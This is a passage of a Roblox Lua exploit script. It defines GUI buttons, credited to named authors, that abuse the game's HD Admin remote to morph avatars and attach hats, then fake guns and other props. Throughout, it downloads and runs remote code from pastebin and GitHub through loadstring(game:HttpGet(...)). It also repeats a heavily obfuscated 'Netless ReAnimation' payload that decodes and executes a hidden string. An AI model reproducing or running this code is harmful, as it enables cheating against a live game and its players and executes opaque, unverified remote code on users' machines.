    loadstring(game:HttpGet(('https://pastebin.com/raw/g1AtSjqF'),true))()
    wait(0.6)
    local plr1 = game:GetService("Players").LocalPlayer; plr1.Character.Humanoid:UnequipTools()
	
    local Tools1 = plr1.Backpack:GetChildren()

	Tools1[1].Grip = CFrame.new(0.121, 1.006, 1.474) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[1].Parent = plr1.Character

	Tools1[2].Grip = CFrame.new(-5.831, 1.006, 1.474) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[2].Parent = plr1.Character

	Tools1[3].Grip = CFrame.new(-11.787, 1.006, 1.474) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[3].Parent = plr1.Character

	Tools1[4].Grip = CFrame.new(-17.729, 1.006, 1.474) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[4].Parent = plr1.Character

	Tools1[5].Grip = CFrame.new(-23.667, 1.006, 1.474) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[5].Parent = plr1.Character

	Tools1[6].Grip = CFrame.new(-29.588, 1.006, 1.474) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[6].Parent = plr1.Character

	Tools1[7].Grip = CFrame.new(0.121, 1.006, 7.295) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[7].Parent = plr1.Character

	Tools1[8].Grip = CFrame.new(0.121, 1.006, -4.429) * CFrame.Angles(0, math.rad(-90),0, 1 -1)
	Tools1[8].Parent = plr1.Character

	local args = {
	[1] = ";unFreeze "
	}
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.669998, 256.463959, -48.8735123, 1, 0, 0, 0, 1, 0, 0, 0, 1)
    wait(0.5)
    function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)    
end)


fescripts:addButton("small pp",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
	local args = {
		[1] = ";morph me DonaldTrump "
	}
	
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
	wait()
	local args1 = {
		[1] = ";morph me Noob1 "
	}
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -49.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args1))
	wait()
	local args2 = {
		[1] = ";freeze "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args2))
	wait()
	local args3 = {
		[1] = ";hat me 4794106130 "
	}
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args3))

	for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = game:GetService("Players").LocalPlayer.Character
		end		
	end
	wait()
	for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
		end
	end

    wait(0.2)
	loadstring(game:HttpGet(('https://pastebin.com/raw/g1AtSjqF'),true))()
	
	local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
	local Tools = plr.Backpack:GetChildren()
 
	Tools[1].Grip = CFrame.new(-1.121, 1.506, -1.174) * CFrame.Angles(4.7, math.rad(-90),0, 1 -1)
	Tools[1].Parent = plr.Character
	
		
		local args = {
		[1] = ";unFreeze "
	}
		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.669998, 256.463959, -48.8735123, 1, 0, 0, 0, 1, 0, 0, 0, 1)
    wait(0.5)
function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)  
end)



fescripts:addButton("small a$$",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
    	--[[small ass]]

	local args = {
		[1] = ";morph me DonaldTrump "
	}
	
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
	wait(0.4)
	local args1 = {
		[1] = ";morph me Noob1 "
	}
	
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -49.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args1))
	wait()
	local args2 = {
		[1] = ";freeze "
	}
	
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args2))
	wait(0.4)
	local args3 = {
		[1] = ";hat me 10911958 "
	}

	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args3))
	wait(0.4)
	local args4 = {
		[1] = ";hat me 11142504 "
	}
	
	game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args4))

wait(0.4)
game.Players.LocalPlayer.Character["Memorial Day 2009 Army Helmet"].Name = "Bob1" 
game.Players.LocalPlayer.Character["Racing Helmet"].Name = "Bob2"

--سكربت blockhats
	wait(0.4)
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") then
            if v.Handle:FindFirstChildOfClass("Mesh") or v.Handle:FindFirstChildOfClass("SpecialMesh") then
                if v.Handle:FindFirstChildOfClass("SpecialMesh") then
                    v.Handle:FindFirstChildOfClass("SpecialMesh"):Remove()
                end
            end
        end
    end
    
		--Tool
			wait(0.4)
	for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = game:GetService("Players").LocalPlayer.Character
		end		
	end
	wait()
	for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
		end
	end

    wait(0.4)
	loadstring(game:HttpGet(('https://pastebin.com/raw/g1AtSjqF'),true))()

    wait(0.4)
	local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
	local Tools = plr.Backpack:GetChildren()

	Tools[1].Grip = CFrame.new(2.150, 1.900, -1.500) * CFrame.Angles(4.7, math.rad(-90),0, 0, 0)
	Tools[1].Parent = plr.Character

	Tools[2].Grip = CFrame.new(2.150, 1.100, -1.500) * CFrame.Angles(4.7, math.rad(-90),0, 0, 0)
	Tools[2].Parent = plr.Character

		local args = {
		[1] = ";unFreeze "
	}
		game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(186.669998, 256.463959, -48.8735123, 1, 0, 0, 0, 1, 0, 0, 0, 1)

-- Netless ReAnimation
-- Created by MiAiHsIs1226
    wait(0.5)
function Senti_IiiiIiIiIiiIiIIiIIiIi_(a,_)if a~=nil then if _>-2+(-41)+(2)+(72)+(95)+(-91)+(30)then print("you're usin fps unlock")end if Senti_IiiiIiIiIiiIiIIiIIiIie then print("you usin synapse.congratulations(I have no idea what to say)")end if("hello")=="x68x65x6Cx6Cx6F"then print("are you usin a bad exploit?")end return true elseif a==nil then return true else return end end Senti_IiiiIiIiIiiIiIIiIIiIie=Senti_IiiiIiIiIiiIiIIiIIiIie or nil Senti_IiiiIiIiIiiIiIIiIIiIid=Senti_IiiiIiIiIiiIiIIiIIiIid or Instance.new("Script") Senti_IiiiIiIiIiiIiIIiIIiIic=game:GetService("Workspace"):GetRealPhysicsFPS() Senti_IiiiIiIiIiiIiIIiIIiIib=game:GetService("Players")['LocalPlayer'] Senti_IiiiIiIiIiiIiIIiIIiIia=Senti_IiiiIiIiIiiIiIIiIIiIi_(Senti_IiiiIiIiIiiIiIIiIIiIib,Senti_IiiiIiIiIiiIiIIiIIiIic) if(not Senti_IiiiIiIiIiiIiIIiIIiIia)==true then return pcall(function()game:GetService("TestService"):Fail("Cannot load script")end)end return xpcall(function(a,b)local c=a local _=b a,b=nil,nil table.clear(c()) local _={} local b={} b.number=(65-(20/100)+.2) local d=getmetatable(newproxy(true)) local a=getmetatable(setmetatable({},{})) spawn(function()if c()then wait() d[2](d[3](d[4]))()else return"bitch"end end) local _=function(_)local d="" local a=function(_)return(_:gsub(".",function(_)if tonumber(_)then return _ else return""end end))end for _,c in next,string.split(_,"\a")do local _=tonumber(a(c)) if _~=nil then d=d..string.char(_-b.number)elseif c then d=d..c end end return d:sub(4)end a.index=_([['{\173;\176;\162;\165;\180;\181;\179;\170;\175;\168;}']]) d={} d[1-(20/100)+.2]=c() d[2-(20/100)+.2]=d[1][a.index] d[3-(20/100)+.2]=_ d[4-(20/100)+.2]=[['{\167;\176;\179;\97;\170;\109;\183;\97;\170;\175;\97;\175;\166;\185;\181;\109;\97;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\145;\173;\162;\186;\166;\179;\180;\99;\106;\111;\141;\176;\164;\162;\173;\145;\173;\162;\186;\166;\179;\111;\132;\169;\162;\179;\162;\164;\181;\166;\179;\123;\136;\166;\181;\133;\166;\180;\164;\166;\175;\165;\162;\175;\181;\180;\105;\106;\97;\165;\176;\78;\75;\170;\167;\97;\183;\123;\138;\180;\130;\105;\99;\131;\162;\180;\166;\145;\162;\179;\181;\99;\106;\97;\162;\175;\165;\97;\183;\111;\143;\162;\174;\166;\97;\191;\126;\99;\137;\182;\174;\162;\175;\176;\170;\165;\147;\176;\176;\181;\145;\162;\179;\181;\99;\97;\181;\169;\166;\175;\97;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\110;\115;\118;\111;\119;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\147;\182;\175;\148;\166;\179;\183;\170;\164;\166;\99;\106;\111;\137;\166;\162;\179;\181;\163;\166;\162;\181;\123;\164;\176;\175;\175;\166;\164;\181;\105;\167;\182;\175;\164;\181;\170;\176;\175;\105;\106;\78;\75;\184;\162;\170;\181;\105;\111;\113;\114;\106;\78;\75;\183;\111;\151;\166;\173;\176;\164;\170;\181;\186;\97;\126;\97;\151;\166;\164;\181;\176;\179;\116;\111;\175;\166;\184;\105;\113;\109;\113;\109;\113;\106;\78;\75;\166;\175;\165;\106;\78;\75;\166;\175;\165;\78;\75;\166;\175;\165;\78;\75;\78;\75;\168;\162;\174;\166;\123;\136;\166;\181;\148;\166;\179;\183;\170;\164;\166;\105;\99;\148;\181;\162;\179;\181;\166;\179;\136;\182;\170;\99;\106;\123;\148;\166;\181;\132;\176;\179;\166;\105;\99;\148;\166;\175;\165;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\109;\97;\188;\97;\78;\75;\149;\170;\181;\173;\166;\97;\126;\97;\99;\143;\176;\181;\170;\167;\170;\164;\162;\181;\170;\176;\175;\99;\124;\78;\75;\149;\166;\185;\181;\97;\126;\97;\99;\143;\166;\181;\173;\166;\180;\180;\97;\162;\164;\181;\170;\183;\162;\181;\166;\165;\157;\175;\132;\179;\166;\162;\181;\166;\165;\97;\163;\186;\97;\142;\170;\130;\170;\137;\180;\138;\180;\114;\115;\115;\119;\99;\124;\78;\75;\138;\164;\176;\175;\97;\126;\97;\99;\179;\163;\185;\181;\169;\182;\174;\163;\123;\112;\112;\181;\186;\177;\166;\126;\130;\180;\180;\166;\181;\103;\170;\165;\126;\118;\114;\113;\120;\114;\121;\115;\114;\114;\117;\103;\184;\126;\114;\118;\113;\103;\169;\126;\114;\118;\113;\99;\124;\78;\75;\133;\182;\179;\162;\181;\170;\176;\175;\97;\126;\97;\114;\119;\124;\190;\106;\78;\75;}']]end,function(_)game:GetService("TestService"):Fail("\n"..(script or Instance.new('Script')):GetFullName().." has occurred an error:".._)end,getfenv,setfenv)

end)

fescripts:addButton("Fe AK",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 7807431641")
    wait()
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4504231783")
    wait(0.7)
    
 
_G.netlessmult = 1
_G.safenetless = false
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/plusgiant5/Libraries/main/Plusgiant5ReanimationV2.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/plusgiant5/Libraries/main/Plusgiant5ReanimationV2/gun.lua"))()
game.StarterGui:SetCore("SendNotification",{
    Title = "note";
    Text = "press e to equip/unequip the gun"
})
end)


fescripts:addButton("FE MINIGUN",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6775268462")
    wait(0.3)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 9063843256")
    wait(1)
    
    loadstring(game:HttpGet("https://pastebin.com/raw/BqFgfYjL"))()

game.StarterGui:SetCore("SendNotification",{
    Title = "note";
    Text = "press e to equip and press q to unequip "
})
end)


fescripts:addButton("Fe Sniper",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 7604332496")
    wait()
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4504231783")
    wait(0.7)
    
loadstring(game:HttpGet("https://pastebin.com/raw/xpmuZr17"))()

end)


fescripts:addButton("GAINT MAN WITH A GUN",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 376526888")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5555280833")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4794106130")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6902333316")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 18015906")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 1744219293")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 1744235800")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 1743941933")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4585144193")
    wait(0.7)
   
    loadstring(game:HttpGet("https://pastebin.com/raw/ercxdsRh"))()

end)


fescripts:addButton("FE SKATE BOARD",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5063577434")
    wait(1)
    
    loadstring(game:HttpGet("https://pastebin.com/raw/em0yQjN4"))()

end)


fescripts:addButton("FE 2 GUNS",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    wait(0.3)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4504231783")
    wait(0.3)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 8262955749")
    wait(0.3)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 7168000945")
    wait(1)
    loadstring(game:HttpGet("https://pastebin.com/raw/1Wendxfd"))()

end)


fescripts:addButton("FE PC",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6678216978")
    wait(0.3)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6678225898")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6531974818")
